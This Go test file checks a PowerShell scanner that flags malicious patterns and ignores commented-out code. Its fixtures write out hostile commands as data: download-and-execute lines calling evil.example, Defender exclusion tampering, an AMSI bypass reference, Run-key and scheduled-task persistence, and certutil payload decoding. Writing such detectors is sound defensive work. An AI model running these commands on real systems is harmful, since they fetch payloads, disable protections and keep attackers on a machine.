package inspect

import "testing"

func TestScanPowerShell_SafeScript(t *testing.T) {
	content := []byte(`# Safe setup script
Write-Output "hello"
Get-ChildItem -Path C:\Temp
<# Invoke-WebRequest http://evil.example/payload.ps1 #>
`)

	signals := ScanPowerShell(content)
	if len(signals) != 0 {
		t.Fatalf("expected 0 signals for safe script, got %d", len(signals))
	}
}

func TestScanPowerShell_CommentSkipping(t *testing.T) {
	content := []byte(`# iex (New-Object Net.WebClient).DownloadString("http://evil.example")
<# 
Invoke-WebRequest http://evil.example/payload.ps1
Start-Process calc.exe
#>
Write-Output "still safe"
`)

	signals := ScanPowerShell(content)
	if len(signals) != 0 {
		t.Fatalf("expected 0 signals for commented-out code, got %d", len(signals))
	}
}

func TestScanPowerShell_DetectsWindowsSignals(t *testing.T) {
	content := []byte(`iex (New-Object Net.WebClient).DownloadString("http://evil.example/payload.ps1")
Start-Process notepad.exe
Add-MpPreference -ExclusionPath C:\Temp
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Temp\evil.exe
New-Object -ComObject Net.WebClient
schtasks /create /tn Updater /tr C:\Temp\evil.exe /sc onlogon
certutil -decode payload.b64 payload.exe
`)

	signals := ScanPowerShell(content)
	categories := powerShellSignalCategories(signals)

	expected := []string{
		"dynamic_exec",
		"http_download",
		"process_spawn",
		"defender_tamper",
		"amsi_bypass",
		"registry_modify",
		"network_object",
		"lolbin",
		"persistence",
	}

	for _, category := range expected {
		if !categories[category] {
			t.Fatalf("expected category %q in signals, got %#v", category, signals)
		}
	}
}

func TestScanPowerShell_DetectsStartAliasProcessSpawn(t *testing.T) {
	content := []byte(`start powershell.exe -Verb RunAs`)

	signals := ScanPowerShell(content)
	categories := powerShellSignalCategories(signals)

	if !categories["process_spawn"] {
		t.Fatalf("expected process_spawn for start alias, got %#v", signals)
	}
}

func powerShellSignalCategories(signals []Signal) map[string]bool {
	categories := make(map[string]bool, len(signals))
	for _, s := range signals {
		categories[s.Category] = true
	}
	return categories
}
